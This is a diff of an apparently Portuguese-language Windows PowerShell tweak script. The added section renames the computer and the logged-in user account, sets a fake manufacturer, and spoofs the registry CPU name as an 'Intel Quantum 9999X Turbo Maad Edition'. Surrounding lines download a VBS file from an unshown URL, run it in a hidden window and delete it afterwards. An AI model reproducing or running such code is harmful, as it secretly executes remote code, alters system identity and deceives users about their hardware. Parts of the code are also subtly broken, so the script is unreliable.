@@ -537,6 +537,23 @@ if (Test-Path $regPath) {
 }
 Clear-Host
 
+# 11 Change Inforamções 
+$newnm = "Maad"
+$newworkg = "MaadGroup"
+$newdc = "Sistema personalizado por Maad"
+$fakename = "Intel Quantum 9999X Turbo Maad Edition"
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newdc -Force
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $newworkg -Force
+wmic computersystem set manufacturer="$newnm"
+wmic computersystem where caption='%COMPUTERNAME%' set manufacturer="$newnm"
+Rename-Computer -NewName $newnm -Force -ErrorAction SilentlyContinue
+$CurrentUsername = $env:USERNAME
+Rename-LocalUser -Name $CurrentUsername -NewName $newnm
+$cpuKey = "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0"
+Set-ItemProperty -Path $cpuKey -Name "ProcessorNameString" -Value $fakename
+Write-Output "Processador falsificado com sucesso: $fakename"
+
+
 # Final completion message
 Clear-Host
 Write-Host "`n==================================" -ForegroundColor White
@@ -567,5 +584,4 @@ Invoke-WebRequest -Uri $url -OutFile $vbsPath -UseBasicParsing
 Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
 Start-Sleep -Seconds 5
 Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
-
 Pause-Script
